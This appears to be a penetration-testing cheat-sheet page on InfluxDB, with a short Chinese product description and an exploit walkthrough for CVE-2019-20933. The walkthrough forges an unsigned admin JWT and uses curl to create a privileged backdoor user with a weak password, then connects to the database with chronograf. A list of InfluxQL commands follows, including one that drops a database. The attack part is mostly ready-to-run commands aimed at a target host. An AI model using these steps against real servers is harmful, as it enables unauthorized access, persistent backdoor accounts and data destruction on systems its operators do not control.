# InfluxDB

<details>

<summary>Introduction</summary>

InfluxDB 是一个开源的时间序列数据库，专为处理时间相关的数据而设计。它特别适用于存储和查询来自传感器、监控系统、应用程序指标和日志等时序数据。InfluxDB 具有高性能、可扩展性和灵活的数据模型，支持快速插入和复杂的查询操作。它提供了丰富的功能，如数据持久化、数据压缩、数据分片和数据可视化等。InfluxDB 还提供了强大的查询语言 InfluxQL 和持续查询功能，使得用户可以方便地分析和监控时序数据。由于其特定的设计和功能，InfluxDB 被广泛应用于监控、物联网、应用程序性能分析和实时数据分析等领域。

</details>

<table><thead><tr><th width="178">Name</th><th>InfluxDB</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>8086</td></tr><tr><td><strong>GetShell?</strong></td><td>Yes</td></tr><tr><td><strong>Vulnerability</strong></td><td>Unauthorized Access (CVE-2019-20933)</td></tr></tbody></table>

## Unauthorized Access (CVE-2019-20933)

{% code title="Environment" %}
```bash
HOST=; PORT=8086; # TARGET HOST INFO
URL=http://$HOST:$PORT;
curl $URL/debug/vars
```
{% endcode %}

Generate a Token using [https://jwt.io/](https://jwt.io/). The HEADER and PAYLOAD are shown below, and the VERIFY SIGNATURE is set to empty.

```bash
# HEADER: ALGORITHM & TOKEN TYPE
{
  "alg": "HS256",
  "typ": "JWT"
}
# PAYLOAD
{
  "username": "admin",
  "exp": 2986346267
}
```

Vulnerabilities can be verified through the curl command (you can also through add HTTP Header to access).

```bash
AUTH="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s"
BODY=q="CREATE USER \"influx\" with PASSWORD '123456' WITH ALL PRIVILEGES;"
curl -X POST -H $AUTH -d $BODY $URL/query
```

If the return result contains the field `{"results":[{"statement_id":0}]}`, it means that the user has been added successfully.

After successfully adding a user, you can use the graphical tool [chronograf](https://github.com/influxdata/chronograf) to operate the database.”

```bash
chronograf --influxdb-url="$URL" --influxdb-username="influx" --influxdb-password="123456"
```

## Commonly used commands

```bash
show databases # Show all databases
show users # Show all users
show measurements # Show all measurements
create user "influx" with password 'password' with all privileges; # Create user
create database "db_name" # Create database
drop database "db_name" # Delete database
use db_name # Use database
select * from measurement_name limit 10 # Query the first ten data of the measurement_name table
```
